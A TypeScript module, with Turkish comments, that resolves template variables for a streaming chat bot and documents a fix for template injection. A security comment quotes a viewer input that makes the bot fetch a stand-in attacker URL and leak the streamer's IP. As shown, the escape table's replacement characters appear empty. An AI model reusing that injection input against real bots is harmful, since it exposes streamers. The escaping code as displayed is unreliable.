/**
 * AxBoT — değişken çözümleyici
 * Developed by AxthrowA
 *
 * Saf metin işleme: veritabanı ve ağ erişimi işleyicilerin içinde, burada
 * yalnız ayrıştırma ve sıra yönetimi var. Bu sayede test edilebilir.
 *
 * Desteklenen sözdizimi (BotRix şablonlarının taşınabilmesi için aynı biçim;
 * uygulama sıfırdan yazıldı, kod kopyalanmadı):
 *   $(ad)              $(ad arg)            $(ad arg1;arg2)
 *   Rand[0,10]         RandomList[a;b;c]    fetch[https://…]
 *   <ifKick>…</ifKick> <ifTwitch>…</ifTwitch> <ifYouTube>…</ifYouTube>
 *   <hideText>…</hideText>
 *
 * Çözümleme sırası:
 *   1) earlyFetch — getirilen içerik değişken içerebilir, önce çözülür
 *   2) İç içe $(...) — EN İÇTEN dışa, maks 3 derinlik
 *   3) Eski biçim köşeli parantezliler
 *   4) Platform koşulları
 *   5) <hideText> — en son, çıktıdan silinir
 */
import { SINIR, type DegiskenBaglam, type DegiskenTanimi } from './types.js';

export type Kayit = Map<string, DegiskenTanimi>;

/**
 * GÜVENLİK — şablon enjeksiyonu (4. tur denetimi).
 *
 * Çözümleyici bir değişkenin DEĞERİNİ metne koyup metni yeniden tarıyordu:
 * yanıtı `Yazdın: $(query)` olan komuta izleyici `!komut $(urlfetch
 * http://saldirgan/x)` yazınca bot o adrese istek atıyor (yayıncının IP'si
 * sızar), `fetch[...]`, `<hideText>`, `<ifKick>` gibi eski biçimler de izleyici
 * metninde çalışıyordu. Kural: değişkenlerin ürettiği değer (izleyici metni,
 * getirilen sayfa, saklanan değer, yapay zekâ yanıtı) VERİdir, kod değildir.
 *
 * Değer metne konurken sözdizimi karakterleri Unicode özel kullanım
 * alanındaki karşılıklarına çevrilir; tarayıcı onları görmez. En sonda geri
 * çevrilir. İşleyiciler argümanlarını GERÇEK metin olarak alır (urlencode
 * gibi dönüşümler bozulmaz). Yalnız `earlyFetch` bilinçli olarak getirdiği
 * içeriği şablon sayar (şablon yazarının tercihi).
 */
const KACIS: ReadonlyArray<readonly [string, string]> = [
  ['$', ''],
  ['(', ''],
  [')', ''],
  ['{', ''],
  ['}', ''],
  ['<', ''],
  ['>', ''],
  ['[', ''],
  [']', '']
];
const KACIS_GIDIS = new Map(KACIS.map(([a, b]) => [a, b]));
const KACIS_DONUS = new Map(KACIS.map(([a, b]) => [b, a]));
const KACIS_GIDIS_RE = /[$(){}<>[\]]/g;
const KACIS_DONUS_RE = /[-]/g;

/** Değeri veri olarak işaretler: yeniden değişken/etiket olarak yorumlanmaz. */
export function veriKacisla(deger: string): string {
  return String(deger).replace(KACIS_GIDIS_RE, (c) => KACIS_GIDIS.get(c) || c);
}

/** İşaretli veriyi gerçek karakterlere döndürür (çıktıda ve işleyici girdisinde). */
export function kacisiGeriAl(metin: string): string {
  return String(metin).replace(KACIS_DONUS_RE, (c) => KACIS_DONUS.get(c) || c);
}

/**
 * Metindeki EN İÇTEKİ `$(...)` ifadesini bulur.
 * İç içe olanları çözebilmek için içinde başka `$(` barındırmayan ilk
 * kapanışı arar. Bulunamazsa null döner.
 */
export function enIcteki(metin: string): { bas: number; bit: number; ic: string } | null {
  // Yığın: her `$(` için konum + içindeki DÜZ parantez derinliği.
  // Düz parantez sayılmazsa `$(math 12 * (3 + 4))` ifadesi ilk `)` işaretinde
  // kesiliyor ve matematik bozuk geliyordu.
  const yigin: Array<{ pos: number; ic: number }> = [];

  for (let i = 0; i < metin.length; i++) {
    if (metin[i] === '$' && metin[i + 1] === '(') {
      yigin.push({ pos: i, ic: 0 });
      i++;
      continue;
    }

    if (metin[i] === '(' && yigin.length) {
      yigin[yigin.length - 1].ic++;
      continue;
    }

    if (metin[i] === ')' && yigin.length) {
      const ust = yigin[yigin.length - 1];
      if (ust.ic > 0) {
        ust.ic--;
        continue;
      }
      yigin.pop();
      return { bas: ust.pos, bit: i, ic: metin.slice(ust.pos + 2, i) };
    }
  }

  return null;
}

/**
 * `$(...)` içeriğini ad ve ham argümana böler.
 * İlk boşluğa kadar olan kısım ad, kalanı ham argüman.
 * `$(local key;default)` gibi kullanımlarda ayırma işleyiciye bırakılır.
 */
export function adVeArguman(ic: string): { ad: string; ham: string } {
  const t = ic.trim();
  const bosluk = t.search(/\s/);
  if (bosluk === -1) return { ad: t.toLowerCase(), ham: '' };
  return { ad: t.slice(0, bosluk).toLowerCase(), ham: t.slice(bosluk + 1).trim() };
}

/** `a;b;c` → ['a','b','c'] (kenar boşlukları kırpılır). */
export function noktaliBol(ham: string): string[] {
  return ham.split(';').map((p) => p.trim());
}

/**
 * Platform koşullu etiketleri uygular.
 * Eşleşen platformun içeriği kalır, diğerleri silinir.
 */
export function platformKosullari(metin: string, platform: string): string {
  const p = String(platform || '').toLowerCase();
  const etiketler: Array<[string, string]> = [
    ['ifTwitch', 'twitch'],
    ['ifKick', 'kick'],
    ['ifYouTube', 'youtube'],
    ['ifDiscord', 'discord'],
    ['ifTikTok', 'tiktok']
  ];

  let sonuc = metin;
  for (const [etiket, hedef] of etiketler) {
    const re = new RegExp(`<${etiket}>([\\s\\S]*?)</${etiket}>`, 'gi');
    sonuc = sonuc.replace(re, (_m, icerik) => (p === hedef ? String(icerik) : ''));
  }
  return sonuc;
}

/** `<hideText>…</hideText>` içeriğini çıktıdan siler (yan etki zaten oluştu). */
export function gizliMetniSil(metin: string): string {
  return metin.replace(/<hideText>[\s\S]*?<\/hideText>/gi, '');
}

/** Ardışık boşlukları toparlar; silinen etiketlerden kalan boşluk temizlenir. */
export function bosluklariTopla(metin: string): string {
  return metin.replace(/[ \t]{2,}/g, ' ').trim();
}

/**
 * Eski biçim köşeli parantezli değişkenler.
 * `fetch[...]` ağ erişimi gerektirdiği için kayıttaki işleyiciye devredilir.
 */
async function eskiBicim(metin: string, kayit: Kayit, ctx: DegiskenBaglam): Promise<string> {
  let sonuc = metin;

  // Rand[min,max]
  sonuc = sonuc.replace(/Rand\[\s*(-?\d+)\s*,\s*(-?\d+)\s*\]/g, (_m, a, b) => {
    const min = Math.min(Number(a), Number(b));
    const max = Math.max(Number(a), Number(b));
    return String(min + Math.floor(Math.random() * (max - min + 1)));
  });

  // RandomList[a;b;c]
  sonuc = sonuc.replace(/RandomList\[([^\]]*)\]/g, (_m, liste) => {
    const secenekler = String(liste)
      .split(';')
      .map((s) => s.trim())
      .filter(Boolean);
    if (!secenekler.length) return '';
    return secenekler[Math.floor(Math.random() * secenekler.length)];
  });

  // fetch[url] — kayıttaki `urlfetch` işleyicisine devredilir
  const getir = kayit.get('urlfetch');
  if (getir) {
    const parcalar = [...sonuc.matchAll(/fetch\[([^\]]+)\]/g)];
    for (const m of parcalar) {
      const deger = await guvenliCagir(getir, String(m[1]).trim(), ctx);
      // Fonksiyonla: değerdeki `$&` gibi diziler yerine koyma kalıbı sayılmasın
      sonuc = sonuc.replace(m[0], () => deger);
    }
  }

  return sonuc;
}

/**
 * İşleyiciyi çağırır; patlarsa komut tamamen çökmesin diye hata metni döner.
 * Argüman gerçek metne çevrilerek verilir; dönen değer VERİ olarak işaretlenir
 * (`veriKacisla`) — `kacislaCikti: false` yalnız earlyFetch içindir.
 */
async function guvenliCagir(
  tanim: DegiskenTanimi,
  ham: string,
  ctx: DegiskenBaglam,
  kacislaCikti = true
): Promise<string> {
  // Test kipinde kalıcı veri değiştiren değişkenler atlanır: test uyarısı
  // gerçek puanı veya sayacı bozmamalı.
  if (tanim.yazar && ctx.isTest) return '';
  try {
    const d = await tanim.isleyici(kacisiGeriAl(ham), ctx);
    const s = d === undefined || d === null ? '' : String(d);
    return kacislaCikti ? veriKacisla(s) : s;
  } catch (e: any) {
    console.warn(`[Değişken] $(${tanim.ad}) hata:`, e?.message || e);
    return `(${tanim.ad} hata)`;
  }
}

/**
 * Şablonu çözer.
 *
 * @param sablon  Komut yanıtı veya uyarı mesajı
 * @param kayit   Değişken kayıt defteri
 * @param ctx     Çalıştırma bağlamı
 */
export async function coz(sablon: string, kayit: Kayit, ctx: DegiskenBaglam): Promise<string> {
  if (!sablon) return '';
  let metin = String(sablon);
  let sayac = 0;

  // 1) earlyFetch önce: getirilen içerik kendi değişkenlerini taşıyabilir
  const erken = kayit.get('earlyfetch');
  if (erken) {
    const parcalar = [...metin.matchAll(/\$\(earlyFetch\s+([^)]+)\)/gi)];
    for (const m of parcalar) {
      if (sayac++ >= SINIR.degisken) break;
      // earlyFetch BİLİNÇLİ olarak getirdiği içeriği şablon sayar: kaçışlanmaz
      const deger = await guvenliCagir(erken, String(m[1]).trim(), ctx, false);
      metin = metin.replace(m[0], () => deger);
    }
  }

  // 2) İç içe $(...) — en içten dışa
  for (let derinlik = 0; derinlik < SINIR.derinlik; derinlik++) {
    let bulundu = false;

    for (;;) {
      const hedef = enIcteki(metin);
      if (!hedef) break;
      if (sayac++ >= SINIR.degisken) {
        metin = metin.slice(0, hedef.bas) + veriKacisla('(sınır aşıldı)') + metin.slice(hedef.bit + 1);
        break;
      }

      const { ad, ham } = adVeArguman(hedef.ic);
      const tanim = kayit.get(ad);
      // Tanımsız değişken: ham metni koru ama parantezi kaldır ki döngüye
      // girmesin. Kullanıcı yazım hatasını görebilsin.
      const deger = tanim ? await guvenliCagir(tanim, ham, ctx) : veriKacisla(`(${ad}?)`);

      metin = metin.slice(0, hedef.bas) + deger + metin.slice(hedef.bit + 1);
      bulundu = true;

      if (metin.length > SINIR.ciktiUzunluk) {
        metin = metin.slice(0, SINIR.ciktiUzunluk);
        break;
      }
    }

    if (!bulundu) break;
  }

  // 3) Eski biçim
  metin = await eskiBicim(metin, kayit, ctx);

  // 4) Platform koşulları
  metin = platformKosullari(metin, ctx.platform);

  // 5) Gizli metin — yan etkiler zaten çalıştı, çıktıdan silinir
  metin = gizliMetniSil(metin);

  // 6) Veri işaretlerini geri al: izleyici metni aynen görünür ama hiçbir
  //    aşamada kod olarak çalışmadı.
  return kacisiGeriAl(bosluklariTopla(metin).slice(0, SINIR.ciktiUzunluk));
}
